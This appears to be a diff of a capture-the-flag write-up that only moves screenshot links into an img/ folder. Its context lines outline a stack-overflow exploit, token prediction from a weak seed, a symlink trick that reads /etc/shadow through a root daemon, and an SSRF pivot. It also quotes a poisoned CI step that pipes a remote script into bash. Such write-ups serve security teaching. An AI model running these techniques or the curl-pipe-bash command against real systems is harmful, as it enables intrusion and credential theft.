@@ -42,7 +42,7 @@ file telemetryd
  
 - 📸 *Screenshot: terminal — `file telemetryd` output confirming architecture (x86-64, dynamically linked, stripped/not stripped)*
 
-![alt text](image-29.png)
+![alt text](img/image-29.png)
  
 ---
  
@@ -54,7 +54,7 @@ checksec --file=telemetryd
  
 - 📸 *Screenshot: terminal — `checksec` output showing `PIE enabled`, `NX enabled`, `Partial RELRO`, `Canary found`*
 
-![alt text](image-30.png)
+![alt text](img/image-30.png)
  
 ---
  
@@ -66,7 +66,7 @@ strings telemetryd | grep -iE "diag|support-ref|ERR|maintenance"
  
 - 📸 *Screenshot: terminal — `strings` output surfacing `diag_dump_secrets`-related strings and the `support-ref %p` banner format string, both still present despite being "dead" in the documented protocol path*
 
-![alt text](image-31.png)
+![alt text](img/image-31.png)
  
 ---
  
@@ -80,9 +80,9 @@ gdb -batch -ex "disas main" ./telemetryd
  
 - 📸 *Screenshot: GDB disassembly — `handle_connection`, highlighting the truncated `movzbl %bpl,%edx` bounds check on `value_len` vs. the full 16-bit length used by the subsequent copy*
 
-![alt text](image-32.png)
+![alt text](img/image-32.png)
 
-![alt text](image-33.png)
+![alt text](img/image-33.png)
  
 - 📸 *Screenshot: GDB disassembly — confirming `main` forks per connection with a `SIGCHLD` reaper, so the PIE base stays constant across the process lifetime*
 
@@ -93,7 +93,7 @@ gdb -batch \
   ./telemetryd | grep -n -E "call.*fork|call.*signal|call.*sigaction|call.*accept|jmp"
 ```
 
-![alt text](image-34.png)
+![alt text](img/image-34.png)
  
  
 **5. Map the exact stack layout**
@@ -102,7 +102,7 @@ Confirmed via disassembly: workspace (216B) → canary (8B) → saved `rbx/rbp/r
  
 - 📸 *Screenshot: annotated stack diagram or GDB `x/40gx $rsp` output showing the offsets used to build the overflow payload*
 
-![alt text](image-35.png)
+![alt text](img/image-35.png)
  
 ---
  
@@ -120,7 +120,7 @@ python3 exploit.py <target-host> <target-port>
  
 - 📸 *Screenshot: terminal — exploit script running end-to-end (canary leak → PIE base leak → overflow sent)*
 
-![alt text](image-36.png)
+![alt text](img/image-36.png)
  
 ---
  
@@ -170,7 +170,7 @@ cat incident.txt
  
 - 📸 *Screenshot: terminal — `incident.txt` describing REV-2419, the compromised account `a.mammadova`, and the legitimate-looking recovery-token issuance the user denies requesting*
 
-![alt text](image-21.png)
+![alt text](img/image-21.png)
  
 ---
  
@@ -182,7 +182,7 @@ cat generator.py
  
 - 📸 *Screenshot: terminal/editor — `TokenGenerator` class showing `seed = int(started_at) ^ zlib.crc32(boot_secret.encode())` and the shared `self._counter` incremented per `issue()` call*
 
-![alt text](image-22.png)
+![alt text](img/image-22.png)
  
 ---
  
@@ -194,7 +194,7 @@ grep "a.mammadova" audit.log
  
 - 📸 *Screenshot: terminal — matching line showing `seq=74 | account=a.mammadova | action=issue_recovery` at `2026-08-30T17:15:20Z`*
 
-![alt text](image-23.png)
+![alt text](img/image-23.png)
  
 ---
  
@@ -204,7 +204,7 @@ grep "a.mammadova" audit.log
 cat issued-samples.json | python3 -m json.tool
 ```
 
-![alt text](image-24.png)
+![alt text](img/image-24.png)
  
 Cross-checked each sample's `requested_at` timestamp against `audit.log` to confirm the counter embedded in each token (`account-<counter>-<hex>`) matches its logged `seq` value exactly.
  
@@ -214,7 +214,7 @@ grep "m.huseynov" audit.log
  
 - 📸 *Screenshot: side-by-side — `issued-samples.json` tokens and their matching `seq` numbers in `audit.log`*
 
-![alt text](image-25.png)
+![alt text](img/image-25.png)
  
 ---
  
@@ -226,7 +226,7 @@ cat service-metadata.json | python3 -m json.tool
  
 - 📸 *Screenshot: terminal — `service-metadata.json` showing `"BOOT_SECRET": "vd-ts-img-7f3e9a1c25b4d608"`, the `deploy_history` restart window (`2026-08-30T14:00:00Z/2026-08-30T14:10:00Z`, "config reload required full restart"), and the `token-svc:1.5.0` image version confirming the secret is unchanged across that restart*
 
-![alt text](image-26.png)
+![alt text](img/image-26.png)
 
 ---
  
@@ -272,7 +272,7 @@ python3 find_seed.py
  
 - 📸 *Screenshot: terminal output — `FOUND seed timestamp: 1788098592 2026-08-30 14:03:12+00:00`, confirming all 3 known samples matched exactly*
 
-![alt text](image-27.png)
+![alt text](img/image-27.png)
  
 ---
  
@@ -300,7 +300,7 @@ python3 predict_token.py
  
 - 📸 *Screenshot: terminal output — predicted token `a.mammadova-74-bd00b37d5eea5bad251a8b8d`*
 
-![alt text](image-28.png)
+![alt text](img/image-28.png)
 
 ---
  
@@ -329,7 +329,7 @@ A production container was suspected compromised via a poisoned image. Given reg
 jq -r '.events[] | .tag' registry-events.json | sort | uniq -c | sort -n
 ```
  
-![alt text](image-5.png)
+![alt text](img/image-5.png)
 ---
  
 **2. Diff the CI job against the known-good baseline**
@@ -338,7 +338,7 @@ jq -r '.events[] | .tag' registry-events.json | sort | uniq -c | sort -n
 diff ci-job-baseline.log ci-job.log
 ```
  
-![alt text](image-6.png)
+![alt text](img/image-6.png)
 ```
   Step 6/9 : RUN curl -fsSL https://dep-proxy.pkg-cache.net/v1/bootstrap.sh | bash
 ```
@@ -352,7 +352,7 @@ jq -c '.events[] | select(.tag=="2.14.3-hotfix.1")' registry-events.json
  
 - 📸 *Screenshot: terminal — push event for `billing/api:2.14.3-hotfix.1`, actor `svc-gitlab-ci`, digest `sha256:d7a04b19c3e1...`*
 
-![alt text](image-7.png)
+![alt text](img/image-7.png)
  
 ---
  
@@ -364,7 +364,7 @@ jq -c '.events[] | select(.Actor.Attributes.image != null and (.Actor.Attributes
  
 - 📸 *Screenshot: terminal — `create`/`start` events for `billing-worker-x7f2d`, image `registry.northstar.io/billing/api:2.14.3-hotfix.1`, namespace `prod`
 
-![alt text](image-9.png)
+![alt text](img/image-9.png)
  
 ---
  
@@ -374,7 +374,7 @@ jq -c '.events[] | select(.Actor.Attributes.image != null and (.Actor.Attributes
 jq -c '.events[] | select(.Actor.Attributes.name=="billing-worker-x7f2d" or .Actor.Attributes.container=="billing-worker-x7f2d")' docker-events.json
 ```
 
-![alt text](image-11.png)
+![alt text](img/image-11.png)
  
 ---
  
@@ -387,7 +387,7 @@ grep '172.19.0.14' dns.log | grep -ivE 'northstar\.io|k8s\.prod\.svc|internal-ap
  
 - 📸 *Screenshot: terminal — filtered output showing normal traffic (github.com, pypi.org, etc.) followed by the suspicious burst*
 
-![alt text](image-12.png)
+![alt text](img/image-12.png)
  
 ---
  
@@ -398,7 +398,7 @@ grep '172.19.0.14' dns.log | grep 'metrics-relay.net' | wc -l
 grep '172.19.0.14' dns.log | grep 'metrics-relay.net' | head -20
 ```
  
-![alt text](image-13.png)
+![alt text](img/image-13.png)
  
 ---
  
@@ -445,7 +445,7 @@ ls -la /etc/vaultdiag/conf.d
  
 - 📸 *Screenshot: terminal — `id` showing `groups=1000(developer),998(diag)`, confirming `diag` group membership; `ps` showing `vaultdiagd.py` running as root*
 
-![alt text](image-14.png)
+![alt text](img/image-14.png)
  
 ---
  
@@ -458,7 +458,7 @@ grep -n "resolve_config\|realpath\|normpath" /opt/vaultdiag/vaultdiagd.py
  
 - 📸 *Screenshot: terminal/editor — `resolve_config()` function highlighted, showing string-only path validation with no `os.path.realpath()` call*
 
-![alt text](image-15.png)
+![alt text](img/image-15.png)
  
 ---
  
@@ -470,7 +470,7 @@ ls -la /run/vaultdiag.sock
  
 - 📸 *Screenshot: terminal — socket showing `srw-rw---- root diag`, confirming `diag` group can connect*
 
-![alt text](image-16.png)
+![alt text](img/image-16.png)
 
 ---
  
@@ -483,7 +483,7 @@ ls -la /etc/vaultdiag/conf.d/pwn
  
 - 📸 *Screenshot: terminal — `ls -la` showing the new symlink `pwn -> /etc/shadow`*
 
-![alt text](image-17.png)
+![alt text](img/image-17.png)
  
 ---
  
@@ -509,7 +509,7 @@ print(s.recv(65536).decode(errors='replace'))
  
 - 📸 *Screenshot: terminal — daemon response containing full `/etc/shadow` content (root and system account password hash lines)*
 
-![alt text](image-18.png)
+![alt text](img/image-18.png)
 
 ---
  
@@ -531,7 +531,7 @@ print(s.recv(65536).decode(errors='replace'))
  
 - 📸 *Screenshot: terminal — daemon response containing the flag file contents*
 
-![alt text](image-19.png)
+![alt text](img/image-19.png)
  
 ---
  
@@ -550,21 +550,21 @@ VaultDesk's "import from URL" feature is fetched server-side by an internal Inte
 
 #### Solving Steps
 - `GET /api/v1/integrations/status` leaked the internal service's exact address and trust model:
-![alt text](image.png)
+![alt text](img/image.png)
 
     Egress policy blocked loopback literals and link-local metadata — **but not internal DNS hostnames**.
 
 - Abused `POST /integrations/import` with `url=http://internal-docs:9000/` to pivot through the worker into the restricted VLAN.
 
-    ![alt text](image-1.png)
+    ![alt text](img/image-1.png)
 
 - The internal service admitted it was **not authenticated** ("requests from the integration network are pre-authenticated") — pure network-based trust.
 
 - Enumerated `/records`, found a `RESTRICTED`-classified cross-tenant record:
-    ![alt text](image-2.png)
+    ![alt text](img/image-2.png)
 
 - Send a requset to specific record:
-    ![alt text](image-3.png)
+    ![alt text](img/image-3.png)
 
 #### Result
 
